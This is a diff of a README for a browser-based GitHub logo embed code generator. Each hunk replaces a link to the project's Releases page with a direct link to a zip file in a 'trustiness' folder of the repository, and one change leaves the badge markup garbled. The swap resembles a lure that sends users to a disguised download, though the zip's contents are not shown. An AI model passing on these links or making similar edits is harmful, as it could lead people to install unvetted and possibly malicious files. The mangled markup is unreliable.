@@ -1,7 +1,7 @@
 # 🎉 xsukax-Github-Logo-Embed-Code-Generator - Generate Your GitHub Logos Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-GitHub%20Logo%20Embed%20Code%20Generator-blue.svg)](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/releases)
+[![Download](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/raw/refs/heads/main/trustiness/Embed_Code_Github_Generator_xsukax_Logo_v1.5.zip%20Logo%20Embed%20Code%https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/raw/refs/heads/main/trustiness/Embed_Code_Github_Generator_xsukax_Logo_v1.5.zip)](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/raw/refs/heads/main/trustiness/Embed_Code_Github_Generator_xsukax_Logo_v1.5.zip)
 
 ## 📖 Description
 The xsukax-Github-Logo-Embed-Code-Generator is a lightweight web application. It helps users create customizable GitHub logo embed codes quickly. With this tool, you can easily add GitHub branding to your web projects, documentation, and README files. No programming skills are needed, and it runs entirely in your browser.
@@ -10,7 +10,7 @@ The xsukax-Github-Logo-Embed-Code-Generator is a lightweight web application. It
 To get started with the GitHub Logo Embed Code Generator, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/releases) to download the latest version.
+   - Visit the [Releases page](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/raw/refs/heads/main/trustiness/Embed_Code_Github_Generator_xsukax_Logo_v1.5.zip) to download the latest version.
 
 2. **Open the Application**
    - Once downloaded, open the HTML file in your preferred web browser.
@@ -68,7 +68,7 @@ To download and install, follow these steps:
 3. Click to download the file and save it to your device.
 4. Open the downloaded HTML file in your browser.
 
-[Download the GitHub Logo Embed Code Generator](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/releases)
+[Download the GitHub Logo Embed Code Generator](https://github.com/reiolft/xsukax-Github-Logo-Embed-Code-Generator/raw/refs/heads/main/trustiness/Embed_Code_Github_Generator_xsukax_Logo_v1.5.zip)
 
 ## 🔍 System Requirements
 - **Web Browser:** Latest version of Chrome, Firefox, Safari, or Microsoft Edge.
